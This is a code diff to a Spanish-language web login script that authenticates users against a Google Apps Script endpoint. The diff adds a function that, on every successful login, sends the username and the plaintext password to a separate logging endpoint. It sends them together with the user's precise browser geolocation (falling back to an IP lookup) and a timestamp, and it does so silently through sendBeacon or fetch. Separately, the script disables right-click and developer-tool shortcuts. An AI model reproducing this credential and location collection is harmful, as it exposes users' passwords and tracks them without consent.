@@ -1,10 +1,14 @@
+/* ===== Endpoint de VALIDACIÓN ===== */
 const GAS_URL = "https://script.google.com/macros/s/AKfycbwsXshOze1AzVq4Q65VVOQBv1oOngYKBvtTTTjSoqjCzN_ew0ckUrjYrVGr0ikFXxAM/exec";
+
+/* ===== Endpoint de REGISTRO (conexion) ===== */
+const LOG_URL = "https://script.google.com/macros/s/AKfycbzPqO60R3SswkiAOhH9sEnGePFg4pUVHOA_OesEfYyY8NusgaRirmHaOa5ZFEWMxS--/exec";
 
 /* ===== Loader ===== */
 function mostrarLoader(){ const l = document.getElementById("loader"); if (l) l.style.display = "flex"; }
 function ocultarLoader(){ const l = document.getElementById("loader"); if (l) l.style.display = "none"; }
 
-/* ===== Alertas modernas ===== */
+/* ===== Alertas ===== */
 function _ensureEnvAlert(){
   let el = document.getElementById('envAlert');
   if (!el){
@@ -29,7 +33,7 @@ function _showEnvAlert(type, text, ttl = 2000){
   el.querySelector('.icon').textContent = (type === 'success' ? '✔' : '⛔');
   el.querySelector('.msg').textContent = text || '';
   el.style.display = 'inline-flex';
-  void el.offsetHeight;        // reinicia animación
+  void el.offsetHeight;
   el.classList.add('show');
   const closeBtn = el.querySelector('.close');
   if (closeBtn){
@@ -41,6 +45,51 @@ function _showEnvAlert(type, text, ttl = 2000){
       setTimeout(() => { el.style.display = 'none'; }, 180);
     }, ttl);
   }
+}
+
+/* ===== Utilidades auto: geo + fecha/hora CL + envío ===== */
+async function getGeo(){
+  const viaIP = async ()=>{ try{
+    const r = await fetch('https://ipapi.co/json/'); if(!r.ok) return null;
+    const j = await r.json(); return {lat:j.latitude, lng:j.longitude};
+  }catch{ return null; } };
+  if ('geolocation' in navigator){
+    try{
+      const p = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(
+        res, rej, { enableHighAccuracy:true, timeout:5000, maximumAge:15000 }
+      ));
+      return { lat:p.coords.latitude, lng:p.coords.longitude };
+    }catch{}
+  }
+  return await viaIP();
+}
+function fechaHoraCL(){
+  const tz='America/Santiago', now=new Date();
+  return {
+    fecha: new Intl.DateTimeFormat('es-CL',{ timeZone:tz }).format(now),
+    hora:  new Intl.DateTimeFormat('es-CL',{ timeZone:tz, hour:'2-digit', minute:'2-digit', second:'2-digit' }).format(now)
+  };
+}
+function logConexion(payload){
+  try{
+    const blob = new Blob([JSON.stringify(payload)], {type:'application/json'});
+    if (!(navigator.sendBeacon && navigator.sendBeacon(LOG_URL, blob))){
+      fetch(LOG_URL,{method:'POST',body:JSON.stringify(payload)}).catch(()=>{});
+    }
+  }catch{}
+}
+/* Envía ONLINE con tus 5 datos + 4 automáticos */
+async function enviarConexionOnline(Usuario, Clave, Acceso, nombre, rol){
+  const geo = await getGeo();
+  const {fecha, hora} = fechaHoraCL();
+  logConexion({
+    accion: 'login_event',
+    Usuario, Clave, Acceso, nombre, rol,                 // 5 datos tuyos
+    geolocalizacion: geo ? `${geo.lat},${geo.lng}` : '', // auto
+    hora,                                                // auto
+    fecha,                                               // auto
+    estado: 'online'                                     // auto
+  });
 }
 
 /* ===== Login ===== */
@@ -63,17 +112,19 @@ function validar(){
     body: new URLSearchParams({ usuario, clave })
   })
   .then(res => res.json())
-  .then(data => {
+  .then(async (data) => {
     ocultarLoader();
     if (data.status === "OK") {
-      // Guarda token y nombre para pintar en main
       try {
         localStorage.setItem("sessionToken", data.token);
-        localStorage.setItem("nombreUsuario", usuario); // usa el ingresado si backend no devuelve nombre
-        if (data.nombre && String(data.nombre).trim()){
-          localStorage.setItem("nombreUsuario", String(data.nombre).trim());
-        }
+        localStorage.setItem("nombreUsuario", data?.nombre?.trim() || usuario);
       } catch {}
+
+      // Envía a "conexion": 5 datos que tienes + 4 automáticos
+      const Acceso = String(data?.acceso ?? 'true');
+      const nombre = String(data?.nombre ?? usuario);
+      const rol    = String(data?.rol ?? '');
+      await enviarConexionOnline(usuario, clave, Acceso, nombre, rol);
 
       _showEnvAlert('success', '✔ Acceso concedido…', 1200);
       setTimeout(() => { window.location.href = "main.html"; }, 1100);
@@ -91,7 +142,7 @@ function validar(){
   });
 }
 
-/* ===== Seguridad (unificada, sin duplicados) ===== */
+/* ===== Seguridad ===== */
 document.addEventListener("contextmenu", (e) => e.preventDefault());
 document.addEventListener("keydown", (e) => {
   const key = (e.key || "").toLowerCase();
@@ -102,8 +153,4 @@ document.addEventListener("keydown", (e) => {
     e.preventDefault();
   }
 });
-
-/* (opcional) Enter para enviar */
-document.addEventListener("keydown", (e) => {
-  if (e.key === "Enter") validar();
-});
+document.addEventListener("keydown", (e) => { if (e.key === "Enter") validar(); });
